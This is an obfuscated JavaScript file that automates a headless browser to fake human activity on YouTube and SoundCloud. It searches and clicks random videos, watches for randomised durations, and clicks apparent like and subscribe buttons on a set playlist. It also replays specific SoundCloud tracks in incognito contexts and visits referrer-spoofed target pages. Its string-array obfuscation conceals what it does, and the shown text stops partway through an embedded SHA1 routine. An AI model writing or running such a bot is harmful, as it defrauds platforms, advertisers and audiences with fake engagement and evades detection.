function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x1 * 0x2374 + -0x65e + -0x1d16);
    let h = e[f];
    if (b['VNZHEE'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x18f1 + 0x69d * 0x3 + 0x2cc8 * -0x1, s, t, u = -0x15b8 + -0x9a6 + 0x1f5e; t = n['charAt'](u++); ~t && (s = r % (0x531 * 0x7 + 0x2110 + 0x1721 * -0x3) ? s * (-0x244 * 0x1 + -0x1 * -0x23ba + 0x147 * -0x1a) + t : t, r++ % (0x19ba + -0x517 * 0x4 + 0x5 * -0x112)) ? p += String['fromCharCode'](0x5 * 0x6cf + -0xaf9 + -0x1613 * 0x1 & s >> (-(0xd13 * -0x2 + -0x6 * -0x3f6 + -0x3 * -0xcc) * r & 0xcd * 0x2f + -0x193b + -0x1 * 0xc62)) : 0x32 * -0x25 + -0x1ac7 + 0x2201) {
          t = o['indexOf'](t);
        }
        for (let v = -0x20cf + 0x28 * 0x7 + 0x1fb7 * 0x1, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x585 + 0x6d6 + -0x141 * 0x1))['slice'](-(0x91 * 0x3e + 0xd74 + -0x3090));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0xedb * -0x2 + -0x255d + -0x3 * -0x28d,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x10b1 + -0x205a + 0x310b; u < 0x420 + 0x1c9d + -0x1fbd; u++) {
          p[u] = u;
        }
        for (u = -0x1fd * 0x3 + -0xe * -0x17e + -0xeed; u < -0x887 + 0x11e6 + -0x85f; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x20cf + -0x1eed + 0x40bc), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x1930 + 0x131b * -0x1 + 0x2c4b, q = 0x804 + -0xd99 * -0x1 + -0x159d;
        for (let v = -0x95 * 0x5 + 0x1a91 * 0x1 + 0x2 * -0xbd4; v < n['length']; v++) {
          u = (u + (0x1049 + 0x1dd2 + -0x3 * 0xf5e)) % (-0x1e21 + 0x62e + 0x18f3), q = (q + p[u]) % (-0x2575 + -0x1cd5 + 0x434a), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x1a * -0x111 + -0x15cb + 0x9 * 0x59d)]);
        }
        return t;
      };
      b['qHcqQo'] = m, c = arguments, b['VNZHEE'] = !![];
    }
    const j = e[0x9b2 * 0x1 + -0x1e33 + 0x1481],
      k = f + j,
      l = c[k];
    return !l ? (b['XvvEta'] === undefined && (b['XvvEta'] = !![]), h = b['qHcqQo'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x1 * 0x2374 + -0x65e + -0x1d16);
    let h = e[f];
    return h;
  }, d(b, c);
}
const Z = c,
  Y = d,
  X = b;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x531 * 0x7 + 0x2110 + 0x3db * -0x12))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x244 * 0x1 + -0x1 * -0x23ba + 0x10bb * -0x2), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x9a5a + -0x109 * 0x76 + 0x31 * 0x1bc + (0x7 * 0xe97 + -0x20ec + -0xf7 * 0xb) * random()) : await standardWaitForNetIdle(f), await wait(0xd13 * -0x2 + -0x6 * -0x3f6 + -0x6 * -0x3a7 + (0xeb * 0x52 + -0x3275 + -0x1 * -0xe3f) * random()), 0x32 * -0x25 + -0x1ac7 + 0x2202;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x20cf + 0x28 * 0x7 + 0x333f * 0x1), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x585 + 0x6d6 + -0x70 * 0x3;
}
async function randomWait() {
  return await wait(0x91 * 0x3e + 0xd74 + -0x1d0a + (-0xedb * -0x2 + -0x255d + -0x1 * -0x1b2f) * random()), -0x10b1 + -0x205a + 0x310c;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x420 + 0x1c9d + -0x20bd, -0x1fd * 0x3 + -0xe * -0x17e + -0xee6), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x6652 + 0xd6cb + 0x79e7) * getRandomInt(-0x20cf + -0x1eed + 0x3fbe, -0x1930 + 0x131b * -0x1 + 0x2c50), h)), 0x804 + -0xd99 * -0x1 + -0x159c;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x95 * 0x5 + 0x1a91 * 0x1 + 0x2 * -0xbd4;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x1049 + 0x1dd2 + -0x3 * 0xf5e]['split']('\x20');
    for (let k = -0x1e21 + 0x62e + 0x17f3; k < i['length']; k += -0x2575 + -0x1cd5 + 0x424c)
      j += i[k] * h[i[k + (0x1a * -0x111 + -0x15cb + 0x3 * 0x1082)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const R = d,
      j = Array['from'](document['querySelec' + 'torAll'](R(0x5)))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x9b2 * 0x1 + -0x1e33 + 0x1487)['map'](l => Array['from'](l['children']))['flat'](-0x21e9 * 0x1 + -0xec * 0x17 + -0x33e * -0x11)['map'](l => l['childNodes'][-0x3 * -0x208 + 0x25 * -0x22 + 0x1 * -0x12d]['childNodes'][-0x62f * -0x3 + 0x8f3 + -0x1b80]['childNodes'][0x1aa7 + 0x11 * 0x4e + 0x3 * -0xa9c]['childNodes'][0x1229 + 0x5 * -0x262 + 0x215 * -0x3]['childNodes'][-0x55f + -0x2196 + -0x26f6 * -0x1]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x4f * 0x3a + -0x22b7 + 0x14b9, 0x1532 * -0x1 + 0x239d + -0x1 * -0x51d)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x3668 + 0x43e7 + -0x3fb7);
  const h = await getMaxTime(f),
    i = Math['min']((0x185fd + -0x11 * -0xde9 + -0x4159 * 0x6) * getRandomInt(0x1 * 0xc61 + 0x1374 + -0x1 * 0x1fd3, 0x149d + -0x2624 + -0x1 * -0x118c), h);
  return await wait(i), 0x199 * -0xd + -0x53 * 0x46 + 0x56f * 0x8;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0x3d * 0x34 + 0x10c * -0x11 + 0x1e30]['children'][0x1372 + -0xba4 + -0x7ce]['children'][0x2169 + 0x1ee7 + 0xe * -0x498]['children'][0xab8 * -0x1 + 0x1f82 + -0xa65 * 0x2]['children'][0x91c + -0x261f + -0x1 * -0x1d03]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x41 * -0x91 + -0x1201 + 0x217 * -0x9;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0xe81 + -0x466 + 0x134b + (-0x402 + -0x1 * 0x1636 + -0x3 * -0x8ce) * random()
  }), await wait(0x78d * 0x5 + 0x25f9 + 0x85 * -0x8e + (-0x214d + -0xb23 + 0x2d9c) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x2138 + 0xe70 + -0x2fa6]['childNodes'][0x1 * -0x6cd + -0x1075 + 0x1743]['childNodes'][-0xa69 + -0x243f + 0x955 * 0x5]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x1971 + -0x7 * 0x227 + 0x53 * 0x7d]['childNodes'][0x2608 + -0x26e1 * 0x1 + 0xd9]['childNodes'][0x1 * 0x1c21 + -0x2e9 * -0x4 + -0x179 * 0x1b]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0xc20 + -0x1e6 + 0xe07),
          r = -0x259 + -0x8b4 + -0x29 * -0x45;
        for (let u = 0xfad + 0xc1b * 0x3 + -0x33fe; u < q['length']; u += 0x25bd + -0x4c5 + -0x107b * 0x2)
          r += q[u] * k[q[u + (0x2b * -0xbb + 0x135b * -0x2 + 0x4620)]];
        return r;
      }(n);
  });
  await wait((-0x17 * -0x3da + 0x634 + -0x2432) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x26f * 0x9c + -0x1061 * -0x4 + 0x22480) * getRandomInt(-0x19d1 + 0x1066 + 0x96c, -0x1557 + 0x622 + 0xf3f), h + (-0x240d + 0x99b + 0x16 * 0x217));
  return await wait(i), -0x1 * -0x20cb + -0x1 * 0xbf5 + -0x14d5;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x75c + 0xc1a + -0x9bb * 0x2), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x1b58 + -0xd7 * 0x3 + -0x5 * -0x851 + (-0xbef + -0x1e09 + 0x2de0) * Math['random']());
    });
  }, 0x1 * -0x25e8 + 0x1 * -0x1102 + -0x2921 * -0x2);
  await wait(-0x6 * -0xa93f + 0x5 * 0x35e3 + -0x7109);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x130b0 + 0x1 * 0x989a + 0x18276) * getRandomInt(0x11fb * -0x1 + 0x1 * -0x266f + -0x2 * -0x1c37, -0x931 * 0x3 + -0x20db + 0x3c87)), clearInterval(h), 0x1a0 + -0xe95 + -0x2a * -0x4f;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x1864 + 0xef5 + -0x59f * 0x7;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0xc39 + 0x1 * -0x1731 + 0xaf9;
    await randomWait();
  }
  return -0x104c + 0x2502 + -0x14b5;
}

function a() {
  const bm = [
    'zgLNzxn0',
    'W7buq8krW4JcIZb+W6LJ',
    'aSoMa2RcQSkbWPRcJmk1ba',
    'guJcMSojW5VdRtJdT8o1WRa',
    'om/22down/',
    '#contents',
    'WRxcRIPkWP/cOwC8WRPW',
    'WOy0xr/cLNzgW60/WOi',
    'PkQpV-Fwhs',
    's\x20news,bts',
    'ry-on-the-',
    'W7H4ftDdkgVdSSopWRy',
    'W7jbqCkaW4JdKM04W7rY',
    'wmkvoSkWlG',
    'z2v0qxr0CMLIDq',
    '-Adblock_K',
    'Ahr0Chm6lY9NCG',
    'ALSZnqQTuJ',
    'W4hdLSk1weyEk3tcRmkQ',
    'zMXHDa',
    'juuZjtGWjtGXjq',
    'WQyXWRGfW7KWzuVdKWu',
    'https://gr',
    'easyfork.o',
    'ys1YywjIAxqTAa',
    'CMCVzw4VC2nYAq',
    'etxdM8kXWOxdPx3dUmorra',
    'cCoEp3hdGM4sWPH4fW',
    'wVnKGSjY3i'
  ];
  a = function() {
    return bm;
  };
  return a();
}

function fetchRandomSC() {
  const S = d;
  return Math['random']() <= 0x4bd * 0x1 + 0x4f * -0x62 + 0x1981 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x221f + 0x1717 + 0xb08 * 0x1 + 0.2 ? 'https://so' + 'undcloud.c' + S(0x4) + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    const U = b;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x2 * 0x1de + -0x25f * -0x1 + -0x61b + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0xcae + -0x1e28 + 0x117a;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          const T = b;
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + T(0x1a, '@QDM') + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x13490 + 0xf37a + 0xf0de + getRandomInt(-0x5aa9 + 0x17 * -0x22b + -0xc71e * -0x1, 0x669d + 0x2cfe * -0x5 + 0xef89));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x1732 + 0x255b + -0x5 * 0xc1c), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x134 * -0x1d + -0x1e01 + -0x4e3;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s[U(0xd, 'PQ^7')](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x2564 * 0x1 + -0x43e + -0x2126, -0xea * -0xd + 0x23e4 * -0x1 + 0x1834)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x1d95 + 0x2127 + -0x36ec + floor((0xb5 * -0xb + -0xb8f + 0xa * 0x253) * random()))), log('p2'), log(await s['evaluate'](() => {
        const V = c;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x3aa2da4 * -0x1 + 0xf6 * 0xb4f8ae + 0x2 * -0x18c8926c),
          0x49ff9d * -0x1 + -0xf9492b + 0x1c348c8,
          0x4e3c + 0x6 * -0xe83 + 0xdaf * 0xa,
          0x225e + 0x1 * 0x119b + -0x3379
        ], y = [
          -0x1400 + 0x193f + 0x527 * -0x1,
          0xe85 + 0x1 * -0xfda + -0x165 * -0x1,
          -0x12b1 + 0x2328 + -0x106f * 0x1,
          -0x1e9b * -0x1 + -0x29 * 0xe + -0x1c5d
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0xf46 * 0x1 + -0x5 * 0xd4 + 0x103 * -0xb)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x16f + -0x100a + 0xe9b; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x17bb + -0x1f47 + 0x3702) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0xe93 * -0x1 + -0x1a1a + 0xd * 0xe3] = A[0x1636 + 0x1d8e + -0x33b4] = A[-0x854 * 0x2 + 0x1c03 + -0xb5a] = A[0x5 * -0x5f3 + -0x1864 + 0x3625] = A[0xfd + 0x329 * -0x1 + 0x22f] = A[-0x111a + 0x1 * 0x349 + 0x1 * 0xdd5] = A[0x808 + -0x2395 + 0x1b92] = A[-0x3f3 * 0x9 + -0x19af + -0x3d4 * -0x10] = A[-0x8e9 * -0x1 + -0xe70 + 0x58e] = A[0x1f * -0x13d + -0xf1 + 0x394 * 0xb] = A[-0x23ee + -0x1 * -0x225d + 0x19a] = A[0x26fe + 0x31 * 0xb6 + 0x761 * -0xa] = A[-0xc8b + 0xf9d * 0x2 + -0x4a9 * 0x4] = A[-0x87 * -0x17 + -0x3a1 * 0x5 + 0x610 * 0x1] = A[-0x1 * -0x150d + -0x3 * -0x449 + -0x21db] = A[-0x1917 * 0x1 + 0xcb7 + 0x2 * 0x637] = A[-0x15 * -0x1be + 0x129b + 0x1 * -0x3722] = 0xf29 + 0x1d6 * 0x9 + -0x1 * 0x1faf, this['blocks'] = A) : this['blocks'] = [
                0x1 * 0x285 + -0xd65 + 0xae0,
                0x16ef + 0x109b + 0xe * -0x2d3,
                -0x3 * -0xa6e + -0x3 * -0x2e3 + 0x27f3 * -0x1,
                -0x53c + -0x1 * 0x211e + 0x265a,
                -0x1 * 0x15de + -0x20e8 + 0x36c6,
                -0x14a8 + 0xaea + 0x9be,
                0x17e3 + -0x2eb * -0x9 + -0x3226,
                -0x1717 + 0x1 * 0x1cdd + 0x5c6 * -0x1,
                -0x1fa5 * 0x1 + 0x5c * 0x5 + 0x9f3 * 0x3,
                -0x1255 + 0x19d1 + -0x1 * 0x77c,
                0x10b1 + -0x81 * 0x7 + -0xd2a,
                -0x1ec5 + 0x1f45 + 0x80 * -0x1,
                0xe99 + 0x1 * -0x1a72 + 0xbd9,
                -0xa32 + 0xb77 + 0x145 * -0x1,
                -0x303 + -0xe49 * -0x2 + -0x198f,
                -0x438 + 0x1d7e + -0x287 * 0xa,
                0x5 * -0x641 + 0x893 + 0x16b2
              ], this['h0'] = 0x7b8042d9 + 0x1 * 0x2643b8a9 + -0x3a7ed881, this['h1'] = 0x670847b * 0x25 + -0x129250c29 + -0x12aaf91eb * -0x1, this['h2'] = 0x7 * 0x21e9ecd6 + 0xac918082 + -0x646262e * 0x29, this['h3'] = 0x17366828 + -0x14541c25 + 0xd500873, this['h4'] = 0xf0f1f1bb + 0x1566f463 + -0x4286042e, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0xb0c + -0x2 * -0xff3 + -0x1de * 0x17, this['finalized'] = this['hashed'] = -0x1 * 0x7d5 + 0x4 * 0x2c2 + -0x333, this['first'] = -0x1 * 0x586 + -0xa * 0x19 + 0x1 * 0x681;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x1 * 0xe2d + 0x1 * -0x1fe + 0x1 * 0x102b, O = J['length'] || 0x27 * -0x5 + -0x962 + -0x1 * -0xa25, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x1 * 0x22a + -0x5df + 0x3b5, P[0xb8a + 0x1492 + -0x201c] = this['block'], P[0x135e + 0xf21 * -0x1 + 0x1 * -0x42d] = P[-0x1dee + -0x1 * 0x232b + 0x411a] = P[-0x2d9 + 0x1c1 * 0x13 + 0x2 * -0xf3c] = P[0x9 * -0x3 + 0x26e * 0x10 + -0x26c2] = P[-0x1344 + -0x26c7 + 0x3a0f] = P[-0x1a74 + -0xc1a + 0x1 * 0x2693] = P[0xfb * 0x1d + -0xc93 + -0xfd6] = P[0x33 * -0x9d + 0x1 * 0x2546 + -0x5f8] = P[-0xd * 0x3e + 0x5cf + 0x1 * -0x2a1] = P[-0x1899 * -0x1 + -0x19f7 + 0x1 * 0x167] = P[-0x4 * 0x814 + 0xb11 * -0x1 + 0x2d * 0xf7] = P[0x22fd + 0x16a4 + -0x7 * 0x83a] = P[0x20f * 0x8 + -0xfb * -0x8 + -0x4 * 0x611] = P[0x1122 + 0x112 + -0x1227] = P[0x12 * -0x202 + 0x29a * 0xd + 0x260] = P[-0x44a + -0x6f * -0x15 + -0x3 * 0x196] = 0x4 * 0x5b3 + 0x11e9 + -0x28b5), K) {
                    for (N = this['start']; M < O && N < 0x2566 + -0x143b * 0x1 + 0x47 * -0x3d; ++M)
                      P[N >> 0x1069 + -0x3b * 0x8 + 0xe8f * -0x1] |= J[M] << y[-0x24d7 + 0x7c4 + 0x1d16 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x1 * 0x180 + 0x2 * 0xfd3 + -0x20e6; ++M)
                      (L = J['charCodeAt'](M)) < -0xaa * 0x12 + -0x2189 * -0x1 + -0x1515 ? P[N >> 0x1b * 0x121 + 0x12d3 * -0x1 + -0x3 * 0x3e2] |= L << y[0x525 + -0x15f3 + 0x10d1 & N++] : L < -0x1 * -0x1484 + -0xe12 + -0x1 * -0x18e ? (P[N >> -0x14f0 + -0x128c + 0x1e * 0x151] |= (-0x2b7 + -0x1a06 + -0x1d7d * -0x1 | L >> -0x781 * -0x4 + -0x56 * -0x1a + -0x1 * 0x26ba) << y[-0x10d * 0xf + -0x9d9 * -0x1 + 0x5ed & N++], P[N >> 0x593 * -0x2 + -0x1 * -0x3a1 + 0x787] |= (-0x2693 + -0x1aa9 + -0x7 * -0x964 | 0x8d * 0x43 + 0x2274 + -0x1bc * 0x29 & L) << y[-0x80c + -0xbf1 + 0x1400 & N++]) : L < -0x1 * 0xe683 + 0xb830 * -0x1 + -0x276b3 * -0x1 || L >= 0x1 * -0x73f3 + 0x1 * 0x19fdf + -0xac * 0x71 ? (P[N >> -0xeaa * 0x1 + -0x265 * 0xd + -0x14f * -0x23] |= (0x3b * 0x45 + -0x1250 * -0x2 + -0x761 * 0x7 | L >> -0xa72 * 0x1 + -0x90e + -0x4e3 * -0x4) << y[0x2 * 0x556 + 0x1cb2 + -0x275b & N++], P[N >> -0x1 * 0x149a + -0x17 * -0x56 + 0xce2] |= (-0x6c5 * 0x2 + 0x1da * -0x10 + -0x1e6 * -0x17 | L >> -0x1aeb + 0x1d0 + 0x1921 & 0x6fb + 0x1f + -0x6db) << y[0xc2d * -0x2 + 0x137b + 0x4e2 & N++], P[N >> -0x1 * -0x1291 + 0x1b65 * -0x1 + 0x8d6] |= (-0x1 * -0xf9 + 0x498 + -0x511 | -0x3e7 * -0x2 + 0x1f07 * -0x1 + 0x1778 & L) << y[-0x74d + 0x2 * -0x6b6 + -0x2 * -0xa5e & N++]) : (L = -0xcd12 + -0xeb44 + -0x22 * -0x147b + ((-0xfa3 * -0x1 + -0x4 * 0x3 + -0xb98 & L) << 0xb * 0x133 + 0x336 * 0x2 + 0x1393 * -0x1 | 0x2 * -0xc65 + -0x1009 + 0x2cd2 * 0x1 & J['charCodeAt'](++M)), P[N >> 0x395 * 0x1 + 0x7ad + -0xb40] |= (-0x7ba + 0x1 * -0xd25 + 0x15cf * 0x1 | L >> -0xb47 + 0x31 * -0x5c + 0x1cf5) << y[-0xd4 * 0xa + 0x5c * -0x8 + -0x1 * -0xb2b & N++], P[N >> 0x1c29 + -0x12c6 + -0x961] |= (0x1412 + 0x88c + 0x2 * -0xe0f | L >> 0x22f * -0x1 + -0x61 * 0x53 + 0x3be * 0x9 & -0x1cb2 + -0xd33 + -0x3e * -0xae) << y[-0x18ef + 0x24d7 + 0x261 * -0x5 & N++], P[N >> -0x2 * 0xeef + 0x1 * 0x21f5 + -0x415] |= (0x6 * 0x583 + -0x237a * 0x1 + -0x2 * -0x174 | L >> 0x4c1 * 0x3 + 0x22a8 + -0x30e5 & -0x11 * 0x9c + 0x2f * -0xb5 + 0x2bd6 * 0x1) << y[-0x1d4d + 0x3 * 0x633 + 0xab7 * 0x1 & N++], P[N >> -0x2175 + -0x189a + -0x5 * -0xb9d] |= (0x1b47 + 0x4 * 0x43 + -0x1bd3 | 0x203f + 0x10f + 0x111 * -0x1f & L) << y[-0x8e4 * 0x2 + 0x9 * 0x117 + 0x7fc & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x10c * -0x24 + -0x1d79 + -0x7f7 * 0x1 ? (this['block'] = P[0x57 * -0x11 + -0x506 + 0xadd], this['start'] = N - (-0x19af + -0x1cc0 + -0x1 * -0x36af), this['hash'](), this['hashed'] = 0x62 * 0x2d + 0x277 + -0x15 * 0xf0) : this['start'] = N;
                }
